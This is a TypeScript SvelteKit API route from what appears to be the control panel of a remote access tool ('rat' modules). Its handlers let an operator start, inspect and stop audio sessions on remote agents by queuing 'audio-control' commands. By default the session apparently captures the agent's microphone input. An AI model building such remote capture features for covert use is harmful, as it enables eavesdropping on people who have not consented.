import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import type { AudioControlCommandPayload, AudioSessionRequest } from '$lib/types/audio';

function normalizeRequest(body: Record<string, unknown>): AudioSessionRequest {
	const request: AudioSessionRequest = {};
	if (typeof body.deviceId === 'string') {
		request.deviceId = body.deviceId;
	}
	if (typeof body.deviceLabel === 'string') {
		request.deviceLabel = body.deviceLabel;
	}
	if (body.direction === 'output') {
		request.direction = 'output';
	} else if (body.direction === 'input') {
		request.direction = 'input';
	}
	if (typeof body.sampleRate === 'number') {
		request.sampleRate = Math.max(1, Math.floor(body.sampleRate));
	}
	if (typeof body.channels === 'number') {
		request.channels = Math.max(1, Math.floor(body.channels));
	}
	if (typeof body.encoding === 'string') {
		request.encoding = body.encoding as AudioSessionRequest['encoding'];
	}
	return request;
}

export const GET: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);

	const session = audioBridgeManager.getSessionState(id);
	return json({ session });
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	const payload = normalizeRequest(body);
	const direction = payload.direction ?? 'input';
	const sampleRate = payload.sampleRate && payload.sampleRate > 0 ? payload.sampleRate : 48_000;
	const channelsRaw = payload.channels && payload.channels > 0 ? payload.channels : 1;
	const channels = Math.max(1, Math.min(2, channelsRaw));
	const encoding = payload.encoding ?? 'pcm16';
	if (encoding !== 'pcm16') {
		throw error(400, 'Only PCM16 audio encoding is supported');
	}

	let session;
	try {
		session = audioBridgeManager.createSession(id, {
			direction,
			deviceId: payload.deviceId,
			deviceLabel: payload.deviceLabel,
			format: { encoding, sampleRate, channels }
		});
	} catch (err) {
		if (err instanceof AudioBridgeError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to create audio session');
	}

	const command: AudioControlCommandPayload = {
		action: 'start',
		sessionId: session.sessionId,
		deviceId: session.deviceId,
		deviceLabel: session.deviceLabel,
		direction: session.direction,
		sampleRate,
		channels,
		encoding
	};

	try {
		registry.queueCommand(id, { name: 'audio-control', payload: command }, { operatorId: user.id });
	} catch (err) {
		audioBridgeManager.closeSession(id, session.sessionId);
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue audio session command');
	}

	return json({ session }, { status: 201 });
};

export const DELETE: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	const session = audioBridgeManager.getSessionState(id);
	if (!session || !session.active) {
		return json({ session });
	}

	if (typeof body.sessionId === 'string' && body.sessionId !== session.sessionId) {
		throw error(409, 'Session identifier mismatch');
	}

	const command: AudioControlCommandPayload = {
		action: 'stop',
		sessionId: session.sessionId
	};

	try {
		registry.queueCommand(id, { name: 'audio-control', payload: command }, { operatorId: user.id });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue audio stop command');
	}

	const next = audioBridgeManager.closeSession(id, session.sessionId);
	return json({ session: next });
};
